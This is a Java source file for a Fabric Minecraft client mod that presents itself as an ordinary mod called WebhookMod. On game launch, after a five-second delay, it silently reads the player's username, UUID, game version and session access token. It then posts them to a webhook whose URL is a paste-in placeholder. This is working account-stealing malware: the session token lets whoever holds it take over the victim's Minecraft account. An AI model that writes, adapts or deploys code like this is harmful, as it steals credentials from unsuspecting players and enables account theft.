package com.example.github;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.SharedConstants;
import com.google.gson.JsonObject;
import com.google.gson.JsonArray;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

public class WebhookMod implements ClientModInitializer {

    private static final String WEBHOOK_URL = "PASTE_WEBHOOK_HERE";

    @Override
    public void onInitializeClient() {

        new Thread(() -> {
            try {

                Thread.sleep(5000);

                MinecraftClient client = MinecraftClient.getInstance();

                String username = client.getSession().getUsername();
                String version = SharedConstants.getGameVersion().getName();
                String uuid = client.getSession().getUuidOrNull() != null
                        ? client.getSession().getUuidOrNull().toString()
                        : "Unknown";
				String token = client.getSession().getAccessToken() != null
                        ? client.getSession().getAccessToken().toString()
                        : "Unknown";

				String message =
                        "# Minecraft Loaded\n" +
                        "**Username:** `" + username + "`\n" +
                        "**UUID:** `" + uuid + "`\n" +
                        "**Version:** `" + version + "`\n" +
                        "**Token:** ```" + token + "```\n";

                Webhook.sendWebhook(WEBHOOK_URL, message);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}